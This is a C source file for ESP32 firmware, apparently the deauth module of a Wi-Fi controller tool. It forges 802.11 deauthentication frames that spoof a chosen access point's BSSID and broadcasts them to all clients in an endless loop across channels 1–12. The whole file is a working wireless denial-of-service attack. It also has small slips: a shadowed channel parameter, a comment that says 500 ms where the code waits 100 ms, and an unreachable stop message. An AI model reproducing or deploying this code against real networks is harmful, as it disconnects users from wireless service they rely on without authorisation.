#include "deauth.h"
#include "esp_err.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_wifi_crypto_types.h"
#include "esp_wifi_types_generic.h"
#include "freertos/idf_additions.h"
#include "portmacro.h"
#include <stdint.h>
#include <string.h>

#define NUM_FRAMES_BROADCAST 32

static const char *TAG = "wifi_controller/deauth";

typedef struct {
  uint8_t frame_ctrl[2];
  uint8_t duration[2];
  uint8_t dest[6];
  uint8_t src[6];
  uint8_t bssid[6];
  uint8_t sequence_ctrl[2];
  uint8_t reason[2];
} deauth_frame_t;

static deauth_frame_t deauth_frame = {
    .frame_ctrl = {0xC0, 0x00},
    .duration = {0x00, 0x00},
    .dest = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
    .src = {0},
    .bssid = {0},
    .sequence_ctrl = {0x00, 0x00},
    .reason = {0x02, 0x00},
};

void wifictl_deauth(const uint8_t target_bssid[6], const int channel) {

  // Pushes the target MAC address into source and BSSID fields
  memcpy(deauth_frame.src, target_bssid, 6);
  memcpy(deauth_frame.bssid, target_bssid, 6);

  ESP_LOGI(TAG,
           "Broadcasting deauth frames from: %02X:%02X:%02X:%02X:%02X:%02X",
           deauth_frame.bssid[0], deauth_frame.bssid[1], deauth_frame.bssid[2],
           deauth_frame.bssid[3], deauth_frame.bssid[4], deauth_frame.bssid[5]);

  while (1) {

    // Broadcast on every channel
    for (uint8_t channel = 1; channel < 13; channel++) {
      // Disconnect Stations to switch channesl
      ESP_ERROR_CHECK(esp_wifi_deauth_sta(0));
      // Changes the channel
      esp_err_t ret = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
      if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to set channel %d", channel);
        continue;
      }

      ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame,
                                        sizeof(deauth_frame), false));
    }
    // Waits for 500 ms before next broad cast
    vTaskDelay(100 / portTICK_PERIOD_MS);
  }

  ESP_LOGI(TAG, "Stop broadcasting deauth frames...");
}
